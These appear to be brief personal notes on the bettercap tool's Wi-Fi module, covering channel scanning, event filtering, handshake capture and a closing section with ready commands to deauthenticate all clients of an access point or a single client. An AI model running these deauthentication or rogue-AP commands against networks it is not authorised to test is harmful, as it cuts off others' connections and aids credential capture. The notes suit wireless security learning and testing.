`# bettercap -iface wlan0`

Bettercap supports 4 standards:
- Bluetooth LE
- HID on 2.4GHz
- Ethernet
- Wi-Fi <-- the one we are interested in

Wi-Fi module has several functions:
- recon: scan the 802.11 spectrum and capture handshakes
- deauth: to deauth
- show: discover networks
- ap: create rogue AP

`# wifi.recon on`
`# wifi.recon.channel 6,11` only hop on channels 6 and 11 (to stop this, run `# wifi.recon.channel clear`)

To limit the output:
`# events.ignore wifi.ap.new`
`# events.ignore wifi.client.new`
`# events.ignore wifi.client.probe`

To show wifi stations:
`# wifi.show`

To run a command continously (so that it updates the stdout output)
`# set ticker.commands "clear; wifi.show"`
`# ticker on`


___

#### Deauthenticating a client

`# wifi.recon on;`
`# wifi.deauth <AP_bssid>` to deauth all clients connected to <AP_bssid>
`# wifi.deauth <client_bssid>` to deauth one client